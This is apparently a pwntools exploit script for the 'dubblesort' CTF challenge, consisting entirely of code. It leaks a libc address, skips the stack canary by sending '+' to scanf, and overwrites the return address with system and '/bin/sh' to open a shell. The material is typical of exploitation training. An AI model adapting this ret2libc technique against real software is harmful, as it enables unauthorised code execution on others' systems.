from pwn import *

def con(argv=[], *a, **kw):
	if args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	elif args.GDB:
		return gdb.debug(exe, gdbscript='''
            b *main+90
            b *main+310
            b *main+340
			c
			''')
	else:
		return process(exe)


exe = './dubblesort'
libc = ELF('./libc.so.6',checksec = False)
io = con()
elf = context.binary = ELF(exe, checksec = False)

context.log_level = 'info'

#---------------------------------------------------------------------

io.sendlineafter(b' :',b'AAAAAAAAAAAAAAAA')
io.recvuntil(b'AAAAAAAAAAAAAAAA\n')
leaked =unpack(io.recv(3).rjust(4,b'\x00'))
info(f'leaked: {hex(leaked)}')
libc.address = leaked - 0x8f800
bin_sh = libc.address + 0x158e8b
system = libc.address + 0x3a940
info(f'libc base: {hex(libc.address)}')
io.sendlineafter(b' :',b'36')
sleep(1)
for i in range(24):
    io.sendlineafter(b' : ',b'1')
io.sendlineafter(b' : ',b'+')
for i in range(33-25):
    io.sendlineafter(b' : ',str(system))
for i in range(3):
    io.sendlineafter(b' : ',str(bin_sh))
'''
33 ret
25 canary
'''
#--------------------------------------------------------------------
io.interactive()
